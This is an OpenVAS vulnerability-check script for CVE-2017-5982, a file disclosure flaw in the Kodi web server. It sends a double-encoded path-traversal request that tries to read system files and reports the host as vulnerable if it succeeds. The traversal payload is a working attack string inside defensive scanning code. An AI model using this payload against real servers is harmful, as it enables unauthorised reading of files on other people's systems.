###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_kodi_file_disc_vuln.nasl 7610 2017-11-01 13:14:39Z jschulte $
#
# Kodi Local File Inclusion Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:kodi:kodi_web_server';

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106586");
  script_version("$Revision: 7610 $");
  script_tag(name: "last_modification", value: "$Date: 2017-11-01 14:14:39 +0100 (Wed, 01 Nov 2017) $");
  script_tag(name: "creation_date", value: "2017-02-13 10:37:26 +0700 (Mon, 13 Feb 2017)");
  script_tag(name: "cvss_base", value: "5.0");
  script_tag(name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2017-5982");

  script_tag(name: "qod_type", value: "exploit");

  script_tag(name: "solution_type", value: "NoneAvailable");

  script_name("Kodi Local File Inclusion Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_kodi_web_server_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("Kodi/WebServer/installed");

  script_tag(name: "summary", value: "Kodi is prone to an arbitrary file disclosure vulnerability.");

  script_tag(name: "vuldetect", value: "Tries to read a system file.");

  script_tag(name: "insight", value: "The web interface loads a thumbnail of an image, video or add-on when
selecting a category in the left menu. Insufficient validation of user input is performed on this URL resulting
in a local file inclusion vulnerability.");

  script_tag(name: "impact", value: "A unauthenticated attacker may read arbitrary files from the file system.");

  script_tag(name: "solution", value: "No solution or patch is available as of 1st November, 2017. Information
regarding this issue will be updated once the solution details are available.");

  script_xref(name: "URL", value: "https://www.exploit-db.com/exploits/41312/");

  exit(0);
}

include("misc_func.inc");
include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {
  url = dir + '/image/image%3A%2F%2F%2e%2e%252f' + str_replace(string: files[file], find: "/", replace: "%252f");

  if (http_vuln_check(port: port, url: url, pattern: file, check_header: TRUE)) {
    report = report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(0);
